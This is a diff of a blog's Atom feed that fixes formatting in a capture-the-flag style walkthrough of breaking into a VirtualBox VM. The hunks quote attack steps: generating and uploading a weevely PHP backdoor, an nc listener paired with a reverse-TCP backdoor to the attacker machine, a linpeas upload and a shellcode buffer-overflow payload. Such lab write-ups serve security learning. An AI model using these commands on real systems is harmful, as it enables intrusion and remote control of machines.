@@ -3,7 +3,7 @@
     <title><![CDATA[devGiants]]></title>
     <link href="/atom.xml" rel="self"/>
     <link href="/"/>
-    <updated>2021-07-16T17:03:58+02:00</updated>
+    <updated>2021-07-16T17:11:58+02:00</updated>
     <id>/</id>
         <generator uri="http://sculpin.io/">Sculpin</generator>
             <entry>
@@ -60,7 +60,7 @@ PORT      STATE SERVICE
 80/tcp    open  http
 111/tcp   open  rpcbind
 40592/tcp open  unknown
-MAC Address: 08:00:27:6A:29:81 (Oracle VirtualBox virtual NIC)
+MAC Address: 12:34:56:78:9A:BC (Oracle VirtualBox virtual NIC)
 
 Nmap done: 1 IP address (1 host up) scanned in 1.68 seconds
 </code></pre>
@@ -275,7 +275,7 @@ and some auto-completion.</p>
 
 <p>On my hacking machine, I generate a backdoor :</p>
 
-<pre><code>#`weevely`generate pass ./shell.php
+<pre><code># weevely generate pass ./shell.php
 </code></pre>
 
 <p>Let's find a place where we can put our backdoor.
@@ -316,7 +316,7 @@ to push the backdoor in HTTP-reachable point, in order to use it. This is the go
 
 <pre><code>weevely http://debian.home/include/shell.php pass
 
-[+]`weevely`4.0.1
+[+] weevely 4.0.1
 
 [+] Target: debian.home
 [+] Session:    /root/.weevely/sessions/debian.home/shell_0.session
@@ -343,7 +343,7 @@ clapton:x:1000:1000:,,,:/home/clapton:/bin/bash
 
 <h3 id="trying-to-break-in-%60clapton%60">Trying to break in <code>clapton</code></h3>
 
-<p>Nothing obvious (to me) at this point. So using<code>weevely``:file_upload</code> command, I uploaded <a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS"><code>linpeas.sh</code></a>.</p>
+<p>Nothing obvious (to me) at this point. So using <code>weevely</code> <code>:file_upload</code> command, I uploaded <a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS"><code>linpeas.sh</code></a>.</p>
 
 <p>But for comfortably running linpeas, or even run <code>su</code> command, a TTY shell is required,
 which is unfortunatly not the case with weevely.</p>
@@ -352,7 +352,7 @@ which is unfortunatly not the case with weevely.</p>
 
 <ul>
 <li>on my hacking machine, <code>nc -lnvp 10000</code> : connection opening on 10000</li>
-<li>on VM, use another<code>weevely</code>command : <code>:backdoor_reversetcp kali 10000</code></li>
+<li>on VM, use another<code>weevely</code> command : <code>:backdoor_reversetcp kali 10000</code></li>
 </ul>
 
 <p>Now, several methods exists for spawning shell with TTY, I used the latter (to be runned on VM) :</p>
@@ -407,7 +407,7 @@ Syntax: ./input &lt;input string&gt;
 <h4 id="decompilation">Decompilation</h4>
 
 <p>I retrieve the executable to my hacking machine by putting it in <code>/var/www/html/include</code>
-(using<code>weevely</code>and www-data user). So after I can regularily download it.</p>
+(using <code>weevely</code> and www-data user). So after I can regularily download it.</p>
 
 <p>Feeding it to <a href="https://ghidra-sre.org/">GHIDRA</a>, here is <code>main</code> function decompiled :</p>
 
@@ -543,7 +543,7 @@ print NOP + shellcode + pad + EIP
 <li><code>struct.pack</code> is useful for little-endianing addresses (bytes inversion)</li>
 </ul>
 
-<p>Then I can push <code>exploit_1.py</code> to VM by using <code>:file_upload``weevely</code>command</p>
+<p>Then I can push <code>exploit_1.py</code> to VM by using <code>:file_upload</code> <code>weevely</code> command</p>
 
 <h5 id="return-address-to-put-in-eip">Return address to put in EIP</h5>
 
